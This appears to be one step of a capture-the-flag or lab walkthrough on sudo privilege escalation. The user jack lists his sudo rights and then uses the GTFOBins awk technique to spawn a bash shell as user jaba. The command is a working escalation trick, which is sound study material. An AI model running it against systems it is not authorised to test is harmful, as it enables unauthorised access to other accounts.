<div class='page'><h1 class='title'>5.1 See jack's sudoers</h1><br/><p></p><p>1. Let see jack&#39;s privileges.</p><p>   <div class="codebox"><pre>jack@jabita<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">sudo</span> -l</pre></div></p><p></p><p>   <span style="color:#ffa500;">Output:</span></p><p>   <img src="images/1043-1.png" alt="images/1043-1.png" /></p><p>    This user can run “/user/bin/awk”  as “jaba” user with no password.</p><p>    </p><p>2. Visit <a href="https://gtfobins.github.io/gtfobins/awk/">https://gtfobins.github.io/gtfobins/awk/</a>.</p><p>   </p><p>    <img src="images/1043-2.png" alt="images/1043-2.png" /></p><p></p><p>3. Run the command.</p><p>   <div class="codebox"><pre>$ <span style="color:#a52a2a;font-weight:700">sudo</span> -u jaba <span style="color:#a52a2a;font-weight:700">awk</span> <span style="color:#ff00ff;font-weight:400">&#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</span></pre></div></p><p>   <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1043-3.png" alt="images/1043-3.png" /></p><p></p><p></p><p>    </p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
